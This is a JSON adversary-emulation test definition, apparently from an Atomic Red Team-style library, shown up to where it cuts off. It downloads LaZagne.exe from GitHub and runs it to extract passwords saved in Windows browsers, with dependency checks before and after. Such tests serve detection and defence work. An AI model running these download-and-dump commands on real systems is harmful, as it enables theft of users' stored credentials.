{
  "id": "9a2915b3-3954-4cce-8c76-00fbf4dbd014",
  "name": "LaZagne - Credentials from Browser",
  "description": "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "92dd9857-8365-4098-9386-18b509e93698",
      "type": "execute-command",
      "data": {
        "command": "\"#{lazagne_path}\" browsers\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "e624b024-cdbf-4b6f-ada5-de04116f5cee",
      "name": "Check dependency 1/1",
      "description": "LaZagne.exe must exist on disk at specified location (#{lazagne_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{lazagne_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "4efdaf8f-a65e-4189-bd89-c5b11d119196",
      "name": "Resolve dependency 1/1",
      "description": "LaZagne.exe must exist on disk at specified location (#{lazagne_path})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{lazagne_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\" -OutFile \"#{lazagne_path}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "679fc482-db2a-4348-a9f1-d4a4b4b67113",
      "name": "Re-check dependency 1/1",
      "description": "LaZagne.exe must exist on disk at specified location (#{lazagne_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{lazagne_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
